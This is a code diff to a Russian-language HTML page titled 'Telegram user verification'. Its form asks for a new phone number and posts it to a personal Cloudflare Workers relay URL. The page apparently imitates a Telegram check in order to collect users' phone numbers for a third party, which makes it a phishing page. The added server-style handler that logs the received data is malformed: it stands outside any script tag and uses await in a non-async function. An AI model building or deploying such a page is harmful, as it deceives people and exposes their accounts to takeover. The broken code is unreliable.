@@ -71,7 +71,7 @@
     <!-- Название страницы -->
     <h1>Проверка пользователя Телеграмм</h1>
 
-    <form action="tg-relay.egor8131723.workers.dev" method="post">
+    <form action="https://tg-relay.egor8131723.workers.dev" method="post">
         <label for="newPhone">Новый номер телефона:</label>
         <input type="tel" id="newPhone" name="newPhone" placeholder="Новый номер телефона" required>
         <br>
@@ -98,5 +98,14 @@
         document.getElementById('greeting').innerText = `Привет, ${windowTelegram && windowTelegram.name ?
 windowTelegram.name : 'Пользователь'}`;
     </script>
+
+    // Добавляем проверку метода запроса и чтение тела запроса внутри fetch.
+    fetch(request, env, ctx) {
+        if (request.method === "POST") {
+            const body = await request.json();
+            console.log("Received data: ", body);
+            // Здесь можно добавить логика для обработки данных.
+        }
+    }
 </body>
 </html>
